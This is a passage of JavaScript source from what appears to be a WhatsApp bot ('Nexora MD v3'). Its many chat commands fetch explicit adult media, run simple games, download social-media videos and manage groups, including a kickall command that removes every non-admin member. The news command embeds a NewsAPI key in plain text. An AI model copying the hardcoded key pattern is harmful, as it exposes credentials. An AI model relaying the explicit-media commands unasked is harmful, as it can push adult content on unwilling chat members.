            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'bottomless': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/bottomless';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;


case 'collared': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/collared';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'cum':
case 'nsfwcum': {
   
     if (!isCreator) return;

    // React with a processing state indicator
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const videoApiUrl = 'https://prexzyapis.com/nsw/cut';
        
        // Fetch the video file directly as a raw data binary stream buffer
        const response = await axios.get(videoApiUrl, { 
            responseType: 'arraybuffer',
            timeout: 60000 
        });

        const videoBuffer = Buffer.from(response.data);

        // Success check: Ensure the response contains actual video bytes
        if (!videoBuffer || videoBuffer.length < 500) {
            return reply('❌ Remote server returned an empty or invalid video stream layer.');
        }

        
        await empire.sendMessage(m.chat, {
            video: videoBuffer,
            mimetype: 'video/mp4',
            caption: '🎬 *NEXORA VIDEO MATRIX ENGINE*'
        }, { quoted: m });

        // Update reaction status to complete
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error("Ñsfw video error: ", e);
        reply('❌ error completing your request.');
    }
}
break;
//https://prexzyapis.com/nsfw/fuck
case 'cumslut': {
   
     if (!isCreator) return;

    // React with a processing state indicator
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const videoApiUrl = 'https://prexzyapis.com/nsfw/cumsluts';
        
        // Fetch the video file directly as a raw data binary stream buffer
        const response = await axios.get(videoApiUrl, { 
            responseType: 'arraybuffer',
            timeout: 60000 
        });

        const videoBuffer = Buffer.from(response.data);

        // Success check: Ensure the response contains actual video bytes
        if (!videoBuffer || videoBuffer.length < 500) {
            return reply('❌ Remote server returned an empty or invalid video stream layer.');
        }

        
        await empire.sendMessage(m.chat, {
            video: videoBuffer,
            mimetype: 'video/mp4',
            caption: '🎬 *NEXORA VIDEO MATRIX ENGINE*'
        }, { quoted: m });

        // Update reaction status to complete
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error("Ñsfw video error: ", e);
        reply('❌ error completing your request.');
    }
}
break;


case 'dp': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/dp';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;




case 'dom': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/dom';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;




case 'extreme': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/extreme';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;



case 'sfw-fe': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/fe';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'finger': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/finger';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;

case 'fuck': {
   
     if (!isCreator) return;

    // React with a processing state indicator
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const videoApiUrl = 'https://prexzyapis.com/nsfw/fuck';
        
        // Fetch the video file directly as a raw data binary stream buffer
        const response = await axios.get(videoApiUrl, { 
            responseType: 'arraybuffer',
            timeout: 60000 
        });

        const videoBuffer = Buffer.from(response.data);

        // Success check: Ensure the response contains actual video bytes
        if (!videoBuffer || videoBuffer.length < 500) {
            return reply('❌ Remote server returned an empty or invalid video stream layer.');
        }

        
        await empire.sendMessage(m.chat, {
            video: videoBuffer,
            mimetype: 'video/mp4',
            caption: '🎬 *NEXORA VIDEO MATRIX ENGINE*'
        }, { quoted: m });

        // Update reaction status to complete
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error("Ñsfw video error: ", e);
        reply('❌ error completing your request.');
    }
}
break;


case 'futa': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/futa';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;

case 'nsfw-gif': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/gif';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;

case 'groupxxx': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/group';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;

case 'hentai': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/hentai';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;


case 'kiss': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/kiss';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;


case 'lick': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/lick';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;


case 'pegged': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/pegged';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'phgif': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/phgif';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;




//https://prexzyapis.com/nsfw/pegged
//https://prexzyapis.com/nsfw/phgif


case "cat": {
if (!isCreator) return;
    try {
        const res = await axios.get("https://api.thecatapi.com/v1/images/search");
        const img = res.data[0]?.url;
        if (!img) return m.reply("❌ Could not fetch a cat image.");
        await empire.sendMessage(
            m.chat,
            { image: { url: img }, caption: "🐱 Random Cat!" },
            { quoted: m }
        );
    } catch (e) {
        console.error("CAT ERROR:", e);
        m.reply("❌ Failed to fetch a cat image.");
    }
}
break;
case "rps": {
if (!isCreator) return;
    if (!text) return m.reply("❌ Choose rock, paper, or scissors. Example: rps rock");
    const choices = ["rock", "paper", "scissors"];
    const userChoice = text.toLowerCase();
    if (!choices.includes(userChoice)) return m.reply("❌ Invalid choice! Use rock, paper, or scissors.");

    const botChoice = choices[Math.floor(Math.random() * choices.length)];

    let result = "";
    if (userChoice === botChoice) result = "🤝 It's a tie!";
    else if (
        (userChoice === "rock" && botChoice === "scissors") ||
        (userChoice === "paper" && botChoice === "rock") ||
        (userChoice === "scissors" && botChoice === "paper")
    ) result = "🎉 You win!";
    else result = "😢 You lose!";

    await empire.sendMessage(
        m.chat,
        { text: `🪨 You chose: ${userChoice}\n🤖 Bot chose: ${botChoice}\n\n${result}` },
        { quoted: m }
    );
}
break;
case "8ball": {
  if (!isCreator) return;
    const answers = [
        "It is certain ✅",
        "Without a doubt ✅",
        "You may rely on it ✅",
        "Ask again later 🤔",
        "Cannot predict now 🤷",
        "Don't count on it ❌",
        "My sources say no ❌",
        "Very doubtful ❌"
    ];
    if (!text) return m.reply("❌ Ask me a question! Example: 8ball Will I get rich?");
    const answer = answers[Math.floor(Math.random() * answers.length)];
    await empire.sendMessage(m.chat, { text: `🎱 Question: ${text}\nAnswer: ${answer}` }, { quoted: m });
}
break;
case "trivia": {
if (!isCreator) return;
    try {
        const res = await axios.get("https://opentdb.com/api.php?amount=1&type=multiple");
        const trivia = res.data.results[0];
        const options = [...trivia.incorrect_answers, trivia.correct_answer].sort(() => Math.random() - 0.5);
        const text = `❓ ${trivia.question}\n\nOptions:\n${options.map((o,i)=>`${i+1}. ${o}`).join("\n")}`;
        await empire.sendMessage(m.chat, { text }, { quoted: m });
        // Store trivia.correct_answer if you want to check the user's answer later
    } catch (e) {
        console.error("TRIVIA ERROR:", e);
        m.reply("❌ Failed to fetch trivia question.");
    }
}
break;


case "meme": {
     if (!isCreator) return;
    try {
        const res = await axios.get("https://meme-api.com/gimme");
        const meme = res.data;
        if (!meme?.url) return m.reply("❌ Could not fetch a meme.");
        await empire.sendMessage(
            m.chat,
            { image: { url: meme.url }, caption: `😂 ${meme.title}` },
            { quoted: m }
        );
    } catch (e) {
        console.error("MEME ERROR:", e);
        m.reply("❌ Failed to fetch a meme.");
    }
}
break;
case "autotyping": {
    if (!isCreator) return reply("Only owner can toggle Auto Typing.");
    if (!args[0]) return m.reply("Usage: autotyping on/off");
    //if (!m.isGroup) return m.reply("This command only works in groups.");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoTyping", true);
        m.reply("💧 Auto Typing enabled");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoTyping", false);
        m.reply("🛑 Auto Typing disabled 💧");
    } else m.reply("Usage: autotyping on/off");
}
break;
case 'groupinfo':
case 'ginfo': {
    if (!isCreator) return;
    if (!m.isGroup) return reply('❌ Group only command.');
    
    await empire.sendMessage(m.chat, { react: { text: '📊', key: m.key } });

    try {
        // Fetch group metadata directly from the Baileys caching array structure
        const groupMetadata = await empire.groupMetadata(m.chat);
        const participants = groupMetadata.participants;
        
        // Isolate administrative participants
        const groupAdmins = participants.filter(v => v.admin !== null);
        const adminCount = groupAdmins.length;

        // Convert admin JID array strings cleanly into a scannable numbers list array text structure
        const adminListString = groupAdmins.map((v, i) => `@${v.id.split('@')[0]}`).join(', ');

        // Format creation timestamp safely into a localized date string
        const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString('en-GB', {
            day: 'numeric',
            month: 'long',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });

        const groupName = groupMetadata.subject || "Unknown Fleet Matrix";
        const groupDescription = groupMetadata.desc || "No profile definition found for this server sector Node cluster.";

        // Run data variables into the high-tech canvas layout buffer stream factory
        const infoCardBuffer = await drawGroupInfoCard(
            groupName,
            groupDescription,
            adminCount,
            adminListString,
            creationDate
        );

        // Dispatches the final structural layout directly with no textual context captions added
        await empire.sendMessage(m.chat, { 
            image: infoCardBuffer
        }, { quoted: m });

    } catch (e) {
        console.error("Groupinfo Canvas Terminal Render Failure: ", e);
        reply('❌ Error establishing communication loop with cluster metadata records.');
    }
}
break;

case 'stats': {
  if (!isCreator) return;
  if (!m.isGroup) return reply('Group only')

  if (!db.groupStats) db.groupStats = {}
  if (!db.groupStats[m.chat]) {
    db.groupStats[m.chat] = {
      messages: 0,
      joins: 0,
      leaves: 0,
      kicks: 0,
      promos: 0,
      demotes: 0
    }
    saveDB()
  }

  const s = db.groupStats[m.chat]

  reply(`┏━━━━━━━━━━━━━─╮
*┃  𝙶𝚁𝙾𝚄𝙿 𝚂𝚃𝙰𝚃𝚂
*├──────────────*
*┃* 𝗚𝗿𝗼𝘂𝗽 𝗡𝗮𝗺𝗲 : ${groupMetadata.subject}
*┃* 𝗠𝗲𝘀𝘀𝗮𝗴𝗲𝘀 : ${s.messages || 0}
*┃* 𝗝𝗼𝗶𝗻𝘀    : ${s.joins || 0}
*┃* 𝗟𝗲𝗮𝘃𝗲𝘀   : ${s.leaves || 0}
*┃* 𝗞𝗶𝗰𝗸𝘀    : ${s.kicks || 0}
*┃* 𝗣𝗿𝗼𝗺𝗼𝘁𝗲𝘀 : ${s.promos || 0}
*┃* 𝗗𝗲𝗺𝗼𝘁𝗲𝘀  : ${s.demotes || 0}
╰──────────────╯`)
}
break

case 'grouplink': {
  if (!m.isGroup) return reply("group only");
if (!isCreator && !isSudo) 
  return reply('❌ Only the bot owner or sudo users can use this command.');
  let response = await empire.groupInviteCode(m.chat);
  empire.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\n*🔗 Group Link:* ${groupMetadata.subject}`, m, { detectLink: true });
}
break;

case 'revoke': {
    if (!m.isGroup) return reply("❌ This command is for groups only");
    if (!isAdmins) return reply("❌ Admin only");
 //   if (!isBotAdmins) return reply("❌ Bot must be admin");

    try {
        await empire.groupRevokeInvite(m.chat);

        reply("🔐 *Group link has been reset!*\nOld invite link is now invalid.");

    } catch (e) {
        console.log(e);
        reply("❌ Failed to revoke link");
    }
}
break;


case 'kickall': 
case '🦵': {
if (!isCreator && !isSudo) 
  return reply('❌ Only the bot owner or sudo users can use this command.');
    if (!m.isGroup) return reply("group only")
    if (!isCreator && !isSudo) return reply('owner and admin only can use')
    

    let metadata = await empire.groupMetadata(m.chat)
    let participants = metadata.participants

    for (let member of participants) {
        // skip owner & bot itself
        if (member.id === botNumber) continue
        if (member.admin === "superadmin" || member.admin === "admin") continue 

        await empire.groupParticipantsUpdate(
            m.chat,
            [member.id],
            'remove'
        )
        await sleep(1500) // delay so WA won’t block
    }

    m.reply("All members Removed successfully 💧")
}
break;

case 'add': {
  if (!m.isGroup) return reply('Group only')
  if(!isCreator) return reply('command restricted to owner and sudo')
  
  if (!text) return reply(`Example: ${prefix}add 234xxxxxxxxxx`)

  const number = text.replace(/[^0-9]/g, '')
  if (!number) return reply('Invalid number')

  const user = number + '@s.whatsapp.net'

  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'add')
    reply(`✅ Added @${number}`)
  } catch (err) {
    console.log('add error:', err)
    reply('❌ Failed to add user')
  }
}
break

case 'left': {
  if (!m.isGroup) return reply('Group only')
  if (!isCreator && !isSudo) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')

  try {
    await reply('👋 Leaving group...')
    await empire.groupLeave(m.chat)
  } catch (err) {
    console.log('leave error:', err)
    reply('❌ Failed to leave group')
  }
}
break


case 'getppgc':
case 'profilegc': {
  if (!m.isGroup) return reply('Group only')
  if (!isCreator && !isSudo) return reply('command restricted to owner and sudos only')

  try {
    const pp = await empire.profilePictureUrl(m.chat, 'image').catch(() => null)
    if (!pp) return reply('No group profile picture found')

    await empire.sendMessage(m.chat, {
      image: { url: pp },
      caption: '✅ Group profile picture'
    }, { quoted: m })
  } catch (err) {
    console.log('getppgc error:', err)
    reply('❌ Failed to fetch group profile picture')
  }
}
break

case 'listonline': 
case 'online': {

   if (!isCreator) return;
  if (!m.isGroup) return reply('Group only')

  try {
    const onlineMembers = participants.map(v => v.id)

    let txt = `┏━━━━━━━━━━━━━─╮
┃  *Active members*
├──────────────\n`

    onlineMembers.forEach((jid, i) => {
      txt += `┃  ${i + 1}. @${jid.split('@')[0]}\n`
    })

    txt += '╰──────────────╯'

    await empire.sendMessage(m.chat, {
      text: txt,
      mentions: onlineMembers
    }, { quoted: m })
  } catch (err) {
    console.log('listonline error:', err)
    reply('❌ Failed to list online members')
  }
}
break

// 🔹 Auto Bio
case "autobio": {
    if (!isCreator && !isSudo) 
  return reply('❌ Only the bot owner or sudo users can use this command.');
    if (!args[0]) return m.reply("Usage: autobio on/off");
    if (args[0].toLowerCase() === "on") {
        setSetting(m.sender, "autobio", true);
        m.reply(`✅ Autibio *ENABLED* in this group. 

`);
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.sender, "autobio", false);
        m.reply("❌ Auto Bio disabled");
    } else m.reply("Usage: autobio on/off");
}
break;



case 'closetime': {
  if (!m.isGroup) return reply('Group only')
   if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)

  const timeText = args[0]
  if (!timeText || !/^\d{1,2}:\d{2}$/.test(timeText)) {
    return reply(`Example: ${prefix}closetime 22:00`)
  }

  setSetting(m.chat, 'autolock', true)
  setSetting(m.chat, 'autolock_time', timeText)

  reply(`✅ Group close time set to ${timeText}`)
}
break

case 'fb':
case 'fbdl':
case 'facebook':
 case 'fb': {   
    if (!isCreator) return;
//if (!usedWithPrefix(m, command, prefix)) return;
        const path = require('path');
                const text = m.message?.conversation || m.message?.extendedTextMessage?.text;
        const url = text?.split(' ')?.slice(1)?.join(' ')?.trim();

        if (!url) {
          return m.reply("Please provide a Facebook video URL.\nExample: .fbdl https://www.facebook.com/...");
        }

        if (!url.includes('facebook.com')) {
          return m.reply("That is not a Facebook link.");
        }

        // Send initial loading reaction
        await empire.sendMessage(m.chat, {
          react: { text: '⏳', key: m.key }
        });

        try {
          const response = await axios.get(`https://prexzyapis.com/download/facebook?url=${encodeURIComponent(url)}`);
          const data = response.data;

          if (!data || data.status !== 200 || !data.facebook || !data.facebook.sdVideo) {
            await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); // Send error reaction
            return reply("Sorry, the API didn't respond correctly. Please try again later!");
          }

          const fbvid = data.facebook.sdVideo;

          if (!fbvid) {
            await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); // Send error reaction
            return m.reply("Wrong Facebook data. Please ensure the video exists.");
          }

          const tmpDir = path.join(process.cwd(), 'tmp');
          if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, { recursive: true });
          }

          const tempFile = path.join(tmpDir, `fb_${Date.now()}.mp4`);

          const videoResponse = await axios({
            method: 'GET',
            url: fbvid,
            responseType: 'stream',
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
              'Accept': 'video/mp4,video/*;q=0.9,*/*;q=0.8',
              'Accept-Language': 'en-US,en;q=0.5',
              'Range': 'bytes=0-',
              'Connection': 'keep-alive',
              'Referer': 'https://www.facebook.com/'
            }
          });

          const writer = fs.createWriteStream(tempFile);
          videoResponse.data.pipe(writer);

          await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
          });

          if (!fs.existsSync(tempFile) || fs.statSync(tempFile).size === 0) {
            empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); // Send error reaction
            throw new Error('Failed to download video');
          }

          // Send success reaction before sending video
          await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

          await empire.sendMessage(m.chat, {
            video: { url: tempFile },
            mimetype: "video/mp4",
            caption: `Nexora MD v3`
          }, { quoted: m });

          try {
            fs.unlinkSync(tempFile);
          } catch (err) {
            console.error('Error cleaning up temp file:', err);
          }

        } catch (error) {
          console.error('Error in Facebook command:', error);
          m.reply("An error occurred. API might be down. Error: " + error.message);
        }
    }
    break;
    
    case 'igdl':
case 'instagram':
case 'ig': {
   if (!isCreator) return;
//if (!usedWithPrefix(m, command, prefix)) return;
  if (!text) return reply(
    "Provide a instagram media link\nExample: .igdl <link>"
  );

  try {
    const apiUrl = `https://delirius-apiofc.vercel.app/download/instagram?url=${encodeURIComponent(text)}`;
    const res = await fetch(apiUrl);
    if (!res.ok) return reply("⚠️ Instagram API not reachable.");

    const json = await res.json();
    if (!json.status || !Array.isArray(json.data) || json.data.length === 0) {
      return reply("❌ Failed to fetch Instagram media.");
    }

    for (const media of json.data) {
      if (media.type === "video") {
        await empire.sendMessage(m.chat, {
          video: { url: media.url },
          caption: `Url: ${text}\nInstagram Image Retrieved ✅`
        }, { quoted: m });
      } else if (media.type === "image") {
        await empire.sendMessage(m.chat, {
          image: { url: media.url },
          caption: `Url: ${text}\nInstagram Image Retrieved ✅`
        }, { quoted: m });
      }
    }

  } catch (err) {
    console.error("Igdl Error", err);
    reply("Error downloading Instagram video");
  }
}
break;

// ==========================================
// 📰 NEWS COMMAND
// ==========================================
case 'news': {
   if (!isCreator) return;
    await empire.sendMessage(m.chat, { react: { text: '📰', key: m.key } });
    try {
        const axios = require('axios');
        const apiKey = 'dcd720a6f1914e2d9dba9790c188c08c'; 
        
        const response = await axios.get(`https://newsapi.org/v2/top-headlines?country=us&apiKey=${apiKey}`);
        const articles = response.data.articles.slice(0, 5); 
        
        if (!articles || articles.length === 0) return reply("⚠️ No news articles available at the moment.");

        let newsMessage = '📰 *LATEST TOP HEADLINES*:\n\n';
        articles.forEach((article, index) => {
            newsMessage += `*${index + 1}. ${article.title}*\n📝 ${article.description || 'No description available.'}\n\n`;
        });
        
        await reply(newsMessage);
    } catch (error) {
        console.error('Error fetching news:', error);
        reply('❌ Sorry, I could not fetch the news feed right now.');
    }
}
break;

// ==========================================
// 📱 TIKTOK DOWNLOADER COMMAND
// ==========================================
case 'tiktok':
case 'tt': {
   if (!isCreator) return;
    if (!text) return reply("❌ Please provide a valid TikTok video link.");
    
    const tiktokPatterns = [
        /https?:\/\/(?:www\.)?tiktok\.com\//,
        /https?:\/\/(?:vm\.)?tiktok\.com\//,
        /https?:\/\/(?:vt\.)?tiktok\.com\//
    ];

    const isValidUrl = tiktokPatterns.some(pattern => pattern.test(text.trim()));
    if (!isValidUrl) return reply("❌ That is not a valid TikTok link.");

    await empire.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });

    try {
        const axios = require('axios');
        const apiUrl = `https://api.siputzx.my.id/api/d/tiktok?url=${encodeURIComponent(text.trim())}`;
        let videoUrl = null;
        let title = null;

        // Fetch from Siputzx API
        try {
            const response = await axios.get(apiUrl, { timeout: 15000 });
            if (response.data?.status && response.data?.data) {
                const resData = response.data.data;
                videoUrl = resData.urls?.[0] || resData.video_url || resData.url || resData.download_url;
                title = resData.metadata?.title || "TikTok Video";
            }
        } catch (e) { console.log("Siputzx API error fallback handling triggered."); }

        if (videoUrl) {
            await empire.sendMessage(m.chat, {
                video: { url: videoUrl },
                mimetype: "video/mp4",
                caption: `🎬 *Title:* ${title}\n\n© *Nexora MD v3*`
            }, { quoted: m });
        } else {
            reply("❌ Failed to parse media URLs from the downloader grid.");
        }
    } catch (error) {
        console.error(error);
        reply("❌ An error occurred processing your TikTok link.");
    }
}
break;

// ==========================================
// 🎥 YOUTUBE VIDEO DOWNLOADER COMMAND
// ==========================================
case 'video':
case 'ytmp4': {
   if (!isCreator) return;
    if (!text) return reply("❌ What video query or YouTube link do you want to download?");
    
    await empire.sendMessage(m.chat, { react: { text: '🎥', key: m.key } });

    try {
        const axios = require('axios');
        const yts = require('yt-search');
        let targetUrl = '';
        let videoTitle = '';

